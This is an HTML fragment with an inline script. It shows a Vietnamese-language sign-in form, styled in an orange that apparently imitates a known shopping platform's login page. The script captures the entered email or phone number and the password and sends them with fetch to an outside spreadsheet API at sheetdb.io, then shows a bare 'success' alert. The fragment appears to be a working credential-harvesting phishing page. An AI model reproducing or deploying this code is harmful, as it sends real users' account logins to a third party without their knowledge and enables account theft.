                <form action="https://sheetdb.io/api/v1/8cviwkjcv9avf" method="POST" id="sheetdb-form">
                    <input name="data[user_name]" class="signIn_bottom_info_bottom_user" placeholder="Email/Số Điện Thoại">
                    <input name="data[password]" class="signIn_bottom_info_bottom_user" placeholder="Mật khẩu">
                    <button type="submit" class="signIn_bottom_info_bottom_user" class="12345" style="background-color:#EE4D2D;">Đăng Kí</button>
                  </form>
                  
                  <script>
                    var form = document.getElementById('sheetdb-form');
                    form.addEventListener("submit", e => {
                      e.preventDefault();
                      fetch(form.action, {
                          method : "POST",
                          body: new FormData(document.getElementById("sheetdb-form")),
                      }).then(
                          response => response.json()
                      ).then((html) => {
                        // you can put any JS code here
                        alert('success')
                      });
                    });
                  </script>
